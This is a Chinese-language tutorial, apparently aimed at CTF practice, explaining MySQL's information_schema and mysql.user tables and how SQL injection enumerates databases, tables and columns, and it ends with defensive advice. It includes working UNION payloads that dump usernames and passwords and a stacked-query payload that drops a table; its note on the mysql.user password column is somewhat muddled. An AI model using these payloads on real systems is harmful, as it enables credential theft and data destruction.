### 一、MySQL 系统表简介

MySQL 的 **系统表** 存储在 `information_schema` 和 `mysql` 数据库中。它们保存了数据库的元数据，如表、列、用户权限、字符集等信息。

- `information_schema`: 存储 MySQL 数据库服务器的元数据信息，用户可以查询这些表来了解数据库的结构。
- `mysql`: 存储 MySQL 用户账户、权限等安全相关的信息。通常只有高权限用户才能访问。

------

### 二、`information_schema` 数据库

`information_schema` 是 MySQL 的元数据表，主要包含以下常用的系统表：

| 系统表             | 描述                                           |
| ------------------ | ---------------------------------------------- |
| `TABLES`           | 存储所有数据库中表的信息，如表名、表类型等。   |
| `COLUMNS`          | 存储所有数据库中列的信息，如列名、数据类型等。 |
| `SCHEMATA`         | 存储所有数据库的名称。                         |
| `KEY_COLUMN_USAGE` | 存储主键、外键等约束信息。                     |
| `USER_PRIVILEGES`  | 存储用户权限信息。                             |
| `CHARACTER_SETS`   | 存储 MySQL 支持的字符集信息。                  |
| `COLLATIONS`       | 存储排序规则相关信息。                         |

------

### 三、常见的 SQL 注入信息枚举过程

通过 **SQL 注入** 攻击，参赛者可以利用系统表来泄露数据库中的敏感信息。以下是常见的步骤：

**获取数据库名称**

```
SELECT schema_name FROM information_schema.schemata;
```

- 获取当前 MySQL 实例中所有数据库的名称。

**获取表名称**

```
SELECT table_name FROM information_schema.tables WHERE table_schema='目标数据库';
```

- 查询某个数据库 (`table_schema`) 中的所有表名。

**获取列名称**

```
SELECT column_name FROM information_schema.columns WHERE table_name='目标表' AND table_schema='目标数据库';
```

- 查询某个表中的所有列名。

**获取表的数据** 一旦知道了表名和列名，可以通过 SQL 注入来获取表内的数据，例如：

```
SELECT login_name, login_passwd FROM lesson_user;
```

------

### 四、基于 `information_schema` 的 SQL 注入示例

假设一个网站存在 SQL 注入漏洞，我们将通过注入获取数据库信息。以下是一个注入场景示例。

#### 场景

网站存在以下查询：

```
SELECT * FROM users WHERE username='$username' AND password='$password';
```

攻击者可以通过修改输入来进行 SQL 注入。

#### 注入步骤

**获取数据库名称**

- 注入 Payload：

  ```
  ' OR 1=1 UNION SELECT schema_name, NULL FROM information_schema.schemata #
  ```

- 解释：通过 `UNION SELECT` 合并查询，列出所有数据库名称。

**获取表名**

- 注入 Payload：

  ```
  ' OR 1=1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='目标数据库' #
  ```

- 解释：查询特定数据库中的所有表。

**获取列名**

- 注入 Payload：

  ```
  ' OR 1=1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #
  ```

- 解释：查询特定表中的所有列名。

**获取敏感数据**

- 注入 Payload：

  ```
  ' OR 1=1 UNION SELECT username, password FROM users #
  ```

- 解释：获取 `users` 表中的用户名和密码。

------

### 五、MySQL 用户账户表 (`mysql.user`)

`mysql.user` 是存储 MySQL 用户信息的表，通常只有高权限用户可以访问。

| 列名          | 描述                                                       |
| ------------- | ---------------------------------------------------------- |
| `Host`        | 用户允许登录的主机。                                       |
| `User`        | 用户名。                                                   |
| `Password`    | 用户密码（MySQL 8.0 之前存储为 `authentication_string`）。 |
| `Select_priv` | 是否有 `SELECT` 权限。                                     |
| `Insert_priv` | 是否有 `INSERT` 权限。                                     |
| ...           | 其他权限字段，如 `UPDATE`, `DELETE` 等。                   |

通过 SQL 注入，攻击者可以尝试获取用户表中的信息，从而进行进一步攻击。

#### 示例：列出 MySQL 用户

```
SELECT user, host FROM mysql.user;
```

------

### 六、CTF 中的 SQL 注入技巧

- **盲注**：当页面没有明显返回查询结果时，可以通过布尔盲注和时间盲注推测信息。

- **基于 `UNION` 的注入**：用于获取多个表的结果，特别是当页面返回数据时。

- 堆叠查询

  （仅限某些数据库支持）：在一条语句中执行多个查询。

  ```
  ' OR 1=1; DROP TABLE lesson_user; #
  ```

### 七、SQL 注入防护

1. **使用预处理语句 (Prepared Statements)**：防止 SQL 注入。
2. **输入验证**：对用户输入进行过滤和验证，防止恶意字符注入。
3. **最小权限原则**：限制数据库用户的权限，防止数据被恶意篡改。
4. **隐藏系统信息**：避免将错误信息直接暴露给用户，防止信息泄露。